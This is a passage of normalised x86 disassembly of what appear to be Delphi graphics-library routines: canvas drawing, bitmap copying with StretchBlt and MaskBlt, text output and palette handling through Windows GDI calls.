mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov [ ebp - 0x28 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
mov [ ebp - 0x28 ] eax
jmp r-xdata
push 0xcc0020
mov eax [ ebp - 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x8 ]
call sub_428308
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBkColor
mov [ ebp - 0x18 ] eax
push 0xe20746
mov eax [ ebp - 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetTextColor
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBkColor
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_428308
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_425bd8
jmp r-xdata
xor eax eax
push ebp
push sub_42508f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_428308
mov dl [ r-xdata ]
call sub_42571c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_424cd4
cmp al 0x1
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
call sub_4032b0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425096
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
retn
sub_4250f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42571c
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_42571c
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_425178
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42571c
mov eax [ ebx + 0x14 ]
call sub_424bb8
call sub_423f34
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423f34
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_417358
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_425224
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42571c
mov eax [ ebx + 0x14 ]
call sub_424bf4
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_425260
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42571c
mov eax [ ebx + 0x14 ]
call sub_424bf4
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_42529c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42571c
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_4252fc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_42571c
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_425328
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42571c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_425370
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42571c
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_4253ac
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_425648
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_4253d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42571c
mov eax ebx
call sub_4253ac
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_40436c
push eax
mov eax esi
call sub_40456c
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_4254a8
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4252fc
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_4254a8
inc eax
add edi eax
sub_425464
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_42571c
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_40436c
push eax
mov eax edi
call sub_40456c
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_4254a8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_425464
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4254c4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_425464
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4254e4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_425530
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425537
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_4252d4
sub_425590
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_42571c
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_4255b4
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_4252fc
pop ecx
pop edx
pop edi
pop esi
retn
sub_4255d4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_42571c
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_425600
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42571c
mov eax [ ebp + 0x8 ]
call sub_423f34
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_425668
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_4256c8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_425668
mov edx esp
mov eax ebx
call sub_425590
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_4255b4
sub_42571c
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_4257b8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
test bl 0x8
je r-xdata
mov eax esi
call sub_4257e4
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_425814
sub_4257b8
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_424408
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423f34
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_4257e4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_424908
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_425814
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_424bf4
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_424bf4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_424cd4
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_424bb8
call sub_423f34
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_424bb8
call sub_423f34
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_425938
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_425982
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425989
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_42598c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_425a28
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_425938
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_40431c
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425a2f
lea eax [ ebp - 0x104 ]
call sub_4040ac
retn
sub_425a44
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_425b92
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_425b01
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_42598c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_42598c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b99
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_425ba4
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_425bd8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_425a34
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_425e58
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_425a34
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425e5f
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_425a34
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_425cab
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406cd0
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425e5f
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_425e6c
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_425ea4
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402cc4
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_425f1c
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_425f74
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028e8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426071
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426078
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_42608c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_426112
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_426124
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028e8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
